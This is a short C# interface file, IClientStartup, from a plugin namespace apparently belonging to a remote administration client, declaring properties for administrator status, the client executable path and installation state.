namespace Orcus.Plugins
{
    /// <summary>
    ///     Information and functions regarding the startup of the client
    /// </summary>
    public interface IClientStartup
    {
        /// <summary>
        ///     True if the client has administration pivileges
        /// </summary>
        bool IsAdministrator { get; }

        /// <summary>
        ///     The path to the client executable
        /// </summary>
        string ClientPath { get; }

        /// <summary>
        ///     True if the client is at it's final position or if it will be copied and restarted at the installation location in the next setp
        /// </summary>
        bool IsInstalled { get; }
    }
}